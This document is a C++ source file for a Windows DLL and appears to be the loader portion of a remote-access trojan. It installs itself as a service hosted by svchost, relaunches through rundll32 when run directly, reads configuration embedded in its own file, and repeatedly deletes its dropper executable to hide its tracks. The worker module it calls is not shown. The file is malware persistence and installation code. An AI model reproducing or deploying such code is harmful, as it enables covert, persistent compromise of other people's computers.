
#include "stdafx.h"
#include "MyMainFunc.h"
#include "MyWorkMoudle.h"

SERVICE_STATUS_HANDLE	hService  = 0;	
SERVICE_STATUS			SrvStatus = {0};
HINSTANCE				ghInstance	= NULL;

BOOL APIENTRY DllMain(HANDLE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    if(DLL_PROCESS_ATTACH == ul_reason_for_call)
	{
		ghInstance = (HINSTANCE) hModule;
		WSADATA	data = {0};
		WSAStartup(MAKEWORD(2, 2), &data);
	}
    return TRUE;
}

int ReportStatus(DWORD dState, DWORD dCode, DWORD dwWaitHint)
{
	static DWORD dwCheckPoint = 1;
	SrvStatus.dwControlsAccepted = SERVICE_ACCEPT_SHUTDOWN;
	SrvStatus.dwCurrentState = dState;
	SrvStatus.dwWin32ExitCode = dCode;
	SrvStatus.dwWaitHint = dwWaitHint;
	SrvStatus.dwCheckPoint = 0;
	SetServiceStatus(hService, &SrvStatus);
	return 1;
}

void WINAPI ServiceCtrl(DWORD code)
{
	switch(code)
	{                           
		case SERVICE_CONTROL_STOP:
			ReportStatus(SERVICE_STOPPED, NO_ERROR, 0);
			return;
		default : break;
	}
	ReportStatus(SrvStatus.dwCurrentState, NO_ERROR, 0);
}

void DoMainWork(PSDLLINFO m_Info)
{
	//删除exe文件
	WIN32_FILE_ATTRIBUTE_DATA m_Data = {0};
	if(m_Info.m_IsDel && m_Info.m_ComFileLen == 0)
	{
		for(int i = 0; i < 10000; i++)
		{
			DeleteFile(m_Info.m_ExeFilePath);
			if(!GetFileAttributesEx(m_Info.m_ExeFilePath, GetFileExInfoStandard, &m_Data))
			{
				break;
			}
			Sleep(1);
		}
	}

	//启动工作过程
	CMyWorkMoudle m_WorkModule;
	m_WorkModule.DoWork(m_Info, ghInstance);
}

void DoMainWorkThread(LPVOID lPvoid)
{
	PSDLLINFO m_DllInfo = {0};
	MyMainFunc::GetFileSaveInfo(&m_DllInfo, sizeof(PSDLLINFO), ghInstance);
	DoMainWork(m_DllInfo);
}

void WINAPI ServiceMain(ULONG dwArgc, LPTSTR* lpszArgv)
{
	PSDLLINFO m_DllInfo = {0};

//	_asm int 3;

	SrvStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS;
	SrvStatus.dwCurrentState = SERVICE_START_PENDING;
	SrvStatus.dwControlsAccepted = SERVICE_ACCEPT_SHUTDOWN;
	SrvStatus.dwWin32ExitCode = 0;
	SrvStatus.dwServiceSpecificExitCode = 0;
	SrvStatus.dwCheckPoint = 0;
	SrvStatus.dwWaitHint = 0;

	//取当前进程名称
	char m_ExeFilePath[256] = {0};
	GetModuleFileName(NULL, m_ExeFilePath, 255);
	CharLower(m_ExeFilePath);

	MyMainFunc::GetFileSaveInfo(&m_DllInfo, sizeof(PSDLLINFO), ghInstance);

	if(StrStr(m_ExeFilePath, "svchost.exe") != NULL)
	{
		//取任务全局信息
		hService = RegisterServiceCtrlHandler(m_DllInfo.m_ServiceName, ServiceCtrl);
		if(hService != NULL) 
		{
			//开始工作
			ReportStatus(SERVICE_RUNNING, 0, 0);
			DoMainWork(m_DllInfo);
			ReportStatus(SERVICE_STOPPED, 0, 0);
		}
	}
	else if(StrStr(m_ExeFilePath, "rundll32.exe") != NULL)
	{
		//dll启动
		_beginthread(DoMainWorkThread, 0, NULL);
		MSG msg;
		while(GetMessage(&msg, 0, 0, 0))
		{
			if(WM_CLOSE_CLIENT_THREAD == msg.message)
			{
				break;
			}
 		}
	}
	else
	{
		//安装服务
		char m_DllName[MAX_PATH] = {0};
		GetModuleFileName(ghInstance, m_DllName, 200);

		//启动rundll32.exe启动模块
		TCHAR m_Text[256] = {0};
		wsprintf(m_Text, "\"%s\",ServiceMain", m_DllName);

		//启动目标模块
		ShellExecute(NULL, NULL, "rundll32.exe", m_Text, NULL, SW_SHOW);
		MyMainFunc::MakeService(m_DllInfo.m_ServiceName, m_DllInfo.m_ServiceView, m_DllInfo.m_ServiceTitle, m_DllName, m_DllInfo.m_DirAddr);
	}
}